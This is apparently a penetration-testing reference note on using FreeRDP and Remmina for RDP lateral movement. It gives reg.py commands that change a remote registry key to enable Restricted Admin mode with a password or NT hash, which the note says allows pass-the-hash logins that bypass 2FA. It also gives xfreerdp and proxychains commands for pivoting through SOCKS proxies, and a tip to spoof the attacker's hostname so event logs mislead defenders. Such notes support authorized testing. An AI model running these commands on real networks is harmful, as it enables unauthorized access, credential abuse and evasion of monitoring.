---
author(s):
  - Userware
tags:
  - post-exploitation
  - pivot
  - lateral-movement
  - socks-proxy
  - windows
---
# FreeRDP

> [!INFO]
> This is will bypass 2FA (two factor authentication) if it was configured in enterprise networks. It allows RDP authentication with Pass The Hash methods.

## 01 - Conditions

Enable restricted admin mode.

```
$ reg.py [<domain>/]<username>:"<password>"@<IP> add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'

$ reg.py [<domain>/]<username>@<IP> -hashes :<nt_hash> add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
```

## 02 - OPSEC Consideration

Change your Linux hostname to the same target workstation to spoof the event logs.

![[Change Hostname#^09eb5b]]

Then apply changes.

![[Change Hostname#^153cb6]]

## 02 - Pivoting with RDP via SOCKS Proxy

### 2.1 - FreeRDP

Builtin SOCKS proxy feature.

```
$ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /sec:<rdp | tls | nla> /proxy:socks5://[<username>:<password>@]<IP>:<PORT> /u:"<username>" /p:"<password>" /v:<IP>:[<PORT>]

$ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /sec:<rdp | tls | nla> /proxy:http://[<username>:<password>@]<IP>:<PORT> /u:"<username>" /p:"<password>" /v:<IP>:[<PORT>]
```

Use with [[Proxychains|proxychains]].

```
$ proxychains xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /sec:<rdp | tls | nla> /u:"<username>" /p:"<password>" /v:<IP>:[<PORT>]
```

### 2.2 - Remmina

Use with [[Proxychains|proxychains]].

```
$ proxychains remmina -c rdp://[<domain>\\]<username>@<IP>:[<PORT>]

$ proxychains remmina -c rdp://[<domain>\\]<username>:<password>@<IP>:[<PORT>]
```

---
## References

- [FreeRDP User Manual](https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/FreeRDP-User-Manual.markdown)

### Hacktricks

- [Hacktricks: Pentesting RDP](https://book.hacktricks.xyz/pentesting/pentesting-rdp)

### Exploit Notes

- [Exploit Notes: RDP pentesting](https://exploit-notes.hdks.org/exploit/windows/protocol/rdp-pentesting/)

### Infinite Logins

- [Infinite Logins: Pass the Hash Attack with RDP](https://infinitelogins.com/2021/02/20/pass-the-hash-attack-with-rdp/)